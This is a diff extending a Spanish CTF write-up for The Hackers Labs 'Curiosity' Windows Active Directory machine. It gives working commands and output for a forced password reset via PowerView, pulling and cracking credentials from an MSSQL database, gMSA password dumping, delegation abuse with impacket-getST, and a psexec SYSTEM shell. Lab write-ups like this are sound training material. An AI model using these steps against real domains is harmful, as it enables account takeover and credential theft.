@@ -4,7 +4,7 @@ description: >-
 title: THL - Curiosity | (Difficulty Medium) - Windows
 date: 2025-02-11
 categories: [Writeup, The Hackers Labs]
-tags: [thl, hacking, the hacker labs, active directory, medium, writeup, redteam, pentesting]
+tags: [thl, hacking, the hacker labs, active directory, sqlcmd, bloodhound, llmnr, ptt, medium, writeup, redteam, pentesting]
 image_post: true
 image: https://github.com/user-attachments/assets/314a021e-123d-4111-ae5c-49c9197ee0c1
 ---
@@ -19,7 +19,12 @@ image: https://github.com/user-attachments/assets/314a021e-123d-4111-ae5c-49c919
 * Information Lekeage
 * AS-REP Roasting
 * BloodHound analysis
-
+* Abusing Force Change Password permission
+* MSSQL data lekeage (sqlcmd)
+* Abusing ReadGMSPassword permission
+* Abusing AllowToAct permission
+* Pass The Ticket
+  
 ## Enumeration
 
 ### TCP Scan
@@ -390,3 +395,223 @@ Starting Neo4j.
 ```
 
 ![image](https://github.com/user-attachments/assets/ca0caf94-0399-4950-8fae-71c05d8a3b49)
+
+El usuario jdoe pertenece al grupo IT Admins, los miembros de este grupo tienen el privilegio de resetear la contraseña del usuario dba_adm
+
+![image](https://github.com/user-attachments/assets/f24c5b4d-6984-4ccb-a7ce-2521444c88d5)
+
+Descargo e importo PowerView.ps1
+
+```bash
+*Evil-WinRM* PS C:\BloodHound> upload PowerView.ps1
+                                        
+Info: Uploading /home/ju4ncaa/Escritorio/PowerView.ps1 to C:\BloodHound\PowerView.ps1
+                                        
+Info: Upload successful!
+```
+
+```bash
+*Evil-WinRM* PS C:\BloodHound> Import-Module .\PowerView.ps1
+```
+
+Para aprovechar este privilegio creo un secure string object que contenga la contraseña que quiero establecer al usuario dba_adm
+
+```bash
+*Evil-WinRM* PS C:\BloodHound> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+```
+
+Utilizo Set-DomainUserPassword para cambiar la contraseña del usuario dba_adm 
+
+```bash
+*Evil-WinRM* PS C:\BloodHound> Set-DomainUserPassword -Identity dba_adm -AccountPassword $UserPassword
+```
+
+Accedo mediante evil-winrm con el usuario dba_adm y la contraseña establecida, la cual es Password123!
+
+```bash
+evil-winrm -i 192.168.1.138 -u dba_adm -p 'Password123!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> 
+```
+
+dba_adm me hace pensar que es un usuario que involucra algo de base de datos, por ello intento obtener los servicios del sistema relacionados con SQL con el Get-Service, pero no es posible ya que requiere mas privilegios de usuario
+
+```bash
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> Get-Service | Where-Object { $_.DisplayName -like "*SQL*" -and $_.Status -eq "Running" }
+Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
+At line:1 char:1
++ Get-Service | Where-Object { $_.DisplayName -like "*SQL*" -and $_.Sta ...
++ ~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
+    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand
+```
+
+Existe otra alternativa, la cual es consultar el registro de Windows con reg o con el comando Get-ItemProperty para visualizarlo de una forma mas clara
+
+```bash
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL"
+
+
+SQLEXPRESS   : MSSQL15.SQLEXPRESS
+PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL
+PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names
+PSChildName  : SQL
+PSDrive      : HKLM
+PSProvider   : Microsoft.PowerShell.Core\Registry
+```
+
+Visualizo que existe un servidor MSSQL llamado SQLEXPRESS, por lo que puedo comenzar a enumerar información, con la herramienta sqlcmd la cual para ejecutar consultas en terminal
+
+* [Trabajar con la línea de comando de SQL Server - sqlcmd](https://www.sqlshack.com/es/trabajar-con-la-linea-de-comando-de-sql-server-sqlcmd/)
+
+Enumero las bases de datos existentes y visualizo la base de datos CredentialsDB que por su nombre parece bastante jugosa
+
+```bash
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> sqlcmd -S DC\SQLEXPRESS -E -Q 'select name from sys.databases'
+name
+--------------------------------------------------------------------------------------------------------------------------------
+master
+tempdb
+model
+msdb
+CredentialsDB
+
+(5 rows affected)
+```
+
+Enumero las tablas de la base de datos CredentialsDB, consigo visualizar que existe una tabla llamada credentials
+
+```bash
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> sqlcmd -S DC\SQLEXPRESS -E -Q 'select table_name from CredentialsDB.information_schema.tables'
+table_name
+--------------------------------------------------------------------------------------------------------------------------------
+Credentials
+
+(1 rows affected)
+```
+
+Enumero las columnas existente en la tabla Credentials de la base de datos CredentialsDB, consigo observar que las columnas son ID, Password y Username
+
+```bash
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> sqlcmd -S DC\SQLEXPRESS -E -Q 'select column_name from CredentialsDB.information_schema.columns'
+column_name
+--------------------------------------------------------------------------------------------------------------------------------
+ID
+Password
+Username
+
+(3 rows affected)
+```
+
+Por ultimo realizo la consulta para obtener la información de la tabla Credentials, consiguiendo obtener la contraseña del usuario sqlsvc
+
+```bash
+*Evil-WinRM* PS C:\Users\dba_adm\Documents> sqlcmd -S DC\SQLEXPRESS -E -Q 'select * from CredentialsDB.dbo.Credentials'
+ID          Username                                           Password
+----------- -------------------------------------------------- ----------------------------------------------------------------------------------------------------
+          1 sqlsvc                                             23012244084524e51305f015727b890b
+
+(1 rows affected)
+```
+
+Utilizo john para intentar cracker la contraseña, consigo obtenerla, la cual es P@ssword1234!
+
+```bash
+for dict in /usr/share/seclists/Passwords/Leaked-Databases/*.txt;do john --wordlist=$dict hash --format=Raw-MD5;done
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+P@ssword1234!    (?)     
+1g 0:00:00:00 DONE (2025-02-11 19:49) 50.00g/s 2726Kp/s 2726Kc/s 2726KC/s p@55w0rd..P0l1c14.2019
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+Utilizo evil-winrm para acceder como el usuario sqlsvc al sistema con la contraseña P@ssword1234!
+
+```bash
+evil-winrm -i 192.168.1.138 -u sqlsvc -p 'P@ssword1234!'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sqlsvc\Documents> whoami
+hackme\sqlsvc
+```
+
+En BloodHound visualizo que el usuario sqlsvc pertenece al grupo GMSA_USERS, los miembros de dicho grupo tienen permisos para leer la contraseña de la cuenta GMSA_SVC
+
+![image](https://github.com/user-attachments/assets/6545f7aa-d142-49e4-8666-d54ff8d10779)
+
+Utilizo la herramienta gMSADumper para obtener el hash de la cuenta GMSA_SVC
+
+```bash
+python3 gMSADumper.py -u sqlsvc -p 'P@ssword1234!' -d hackme.thl
+Users or groups who can read password for GMSA_SVC$:
+ > GMSA_USERS
+GMSA_SVC$:::e7b1825682b530f4879b71a46c5ecb05
+GMSA_SVC$:aes256-cts-hmac-sha1-96:9eb3f39960ffb6500d2e9798661255d6c903929cc3e850d29cbf5413870e3c1c
+GMSA_SVC$:aes128-cts-hmac-sha1-96:00e86b8d9bf77b1e9455852e4673aba8
+```
+
+### Privilege escalation
+
+Utilizo BloodHound y visualizo que la cuenta GMSA_SVC posee el permiso AlloweToAct, lo que permite obtener un TGS utilizando getST e impersonar al usuario Administrator
+
+![image](https://github.com/user-attachments/assets/de68ae00-455e-4c77-9700-b6a09b621232)
+
+Utilizo la herramienta impacket-getST para solicitar un TGS al servicio CIFS haciendo uso del usuario GMSA_SVC
+
+```bash
+impacket-getST -spn 'cifs/DC.hackme.thl' -impersonate 'administrator' 'hackme.thl/GMSA_SVC$' -hashes ':e7b1825682b530f4879b71a46c5ecb05' -dc-ip 192.168.1.138
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow()
+/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[*] Requesting S4U2self
+/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow()
+/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_DC.hackme.thl@HACKME.THL.ccache
+```
+
+> Sincronizar el reloj con el Domain Controller para que el ataque contra Kerberos funcione correctamente
+{: .prompt-tip }
+
+Con el ticket generado puedo autenticarme ante cualquier servicio, por ejemplo, acceder al sistema como usuario con máximos privilegios con impacket-psexec
+
+```bash
+KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache impacket-psexec -k -no-pass Administrator@DC.hackme.thl
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on DC.hackme.thl.....
+[*] Found writable share ADMIN$
+[*] Uploading file ITFiRPtZ.exe
+[*] Opening SVCManager on DC.hackme.thl.....
+[*] Creating service KGII on DC.hackme.thl.....
+[*] Starting service KGII.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
